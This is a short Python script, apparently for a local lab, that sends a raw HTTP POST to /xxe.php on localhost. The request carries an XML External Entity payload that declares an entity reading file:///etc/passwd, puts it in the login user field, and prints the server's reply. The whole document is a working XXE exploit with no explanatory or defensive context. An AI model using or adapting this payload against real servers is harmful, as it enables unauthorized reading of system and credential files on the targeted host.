import socket
server=socket.socket()
file='''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE login [
<!ENTITY gathering SYSTEM "file:///etc/passwd">
]>

<login>
<user>&gathering;</user>
<pass>Hacked</pass>
</login>

'''
server.connect(('localhost',80))
headers=f'''POST /xxe.php HTTP/1.1\r
Host: localhost\r
Content-Length: {len(file)}\r
Content-Type: application/x-www-form-urlencoded\r
Connection: Close\r
\r
{file}
'''
server.send(bytes(headers,'utf-8'))
print(server.recv(2048).decode('utf-8'))
